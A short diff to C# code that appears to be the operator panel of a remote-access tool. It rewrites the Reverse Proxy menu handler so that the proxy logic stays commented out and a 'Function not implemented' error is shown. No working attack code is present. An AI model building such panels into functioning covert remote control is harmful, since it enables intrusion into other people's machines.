@@ -654,9 +654,9 @@ namespace Server
         }
         private void ReverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            /*try
+            try
             {
-                MsgPack packet = new MsgPack();
+                /*MsgPack packet = new MsgPack();
                 packet.ForcePathObject("Pac_ket").AsString = "proxy";
 
                 MsgPack msgpack = new MsgPack();
@@ -671,18 +671,19 @@ namespace Server
                     {
                         proxy = new FrmReverseProxy
                         {
-
-                        };
+                            
+                        }
                         proxy.Show();
                         ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
-                }
+                }*/
+                throw new Exception("Function not implemented.");
             }
             catch (Exception ex)
             {
+                MessageBox.Show(ex.Message, "Reverse Proxy", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
-            }*/
-            MessageBox.Show("Function not implemented.", "Reverse Proxy", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
 
         private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
